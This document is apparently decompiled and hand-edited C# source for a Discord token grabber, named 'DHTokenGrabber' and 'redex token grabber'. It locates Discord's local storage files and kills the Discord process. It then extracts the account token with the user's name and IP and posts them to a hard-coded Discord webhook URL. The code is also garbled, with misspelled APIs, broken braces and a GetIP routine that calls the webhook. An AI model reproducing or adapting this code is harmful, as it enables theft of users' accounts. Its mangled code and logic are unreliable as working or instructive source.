https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3
staff
namespace DHTokenGrabber
{   
// token: RID: 365 RVA: file Offset:
internal class program
{

 // token:RID:366 RVA:0x00008888 File Offset:0x000000424
 private static void mai(string[]argvs)
 {  
     string text=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\local storage\\leveldb";
     if(!Grabber.FinLfb(ref text)&& !Grabber.FinLog(ref text))
     {  
         program.SenWH("no valid .ldb or .log file found");
     }
     process[] processesByName= process.GetProcessysByName("Discord");
     for(int i = 0;i < processesByName.Lenght; i++)
     {
         processesByName[i].kill();
     }
     Thread.sleep(100);
     string text2 = Grabber.GetToken(text, text.EndsWith(".log"));
     if(text2 =="")
     {
         text2 = "not found";
     }
     program.SenWH(text2);
 }

 // Token: 0x0600007 RID: 7 RVA: 0x000022B4 File Offset: 0x000004B4
 private static void SenWH(string Token)
 {  
     httpClient httpClient = new httpClient();
     MultiPlataformDataContent MultiPlataformDataContent = new MultiPlataformDataContent(); 
     MultiPlataformDataContent.add(new stringContent("DiscordHaxx Token Grabber"), "username");
     MultiPlataformDataContent.add(new stringContent(), "avatar_url");
     MultiPlataformDataContent.add(new string.Concat(new string[]
{
"Token by"
Environment.username,
" on ",
program.GetIP();
"\r\nResult",
token
"content");
}))),
try 
{
    httpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).result;
}
catch (Exception)
{
}
 }
 // Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
 private static string GetIP()
 {
     string result;
     try
 }
  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3").result;
}
catch (WebException)
}
result = "unable to get  IP";
}
return result;
}
}
}   
public static void sendWebHook(string discordWebHook,string content)
{
    try
    {   
        httpClient httpClient = new httpClient();
        Dictionary<string, string> nameValuecollection = new  Dictionary<string, string>
        { 
            {
                "content",
                "´´´" + string.join("\n",new string[]
                {
                    content
                }) + "´´´"
            },
            {
                "AlbeiroDos1131#5222"
                "redex token grabber"
            },
            {
                "Discord undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"

            }
        };
        httpClient.PostAsync(https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
        catch (WebException)
        {
        }
    }
    // token: RID:366 RVA:0x00008888 File Offset:e
    
    
   
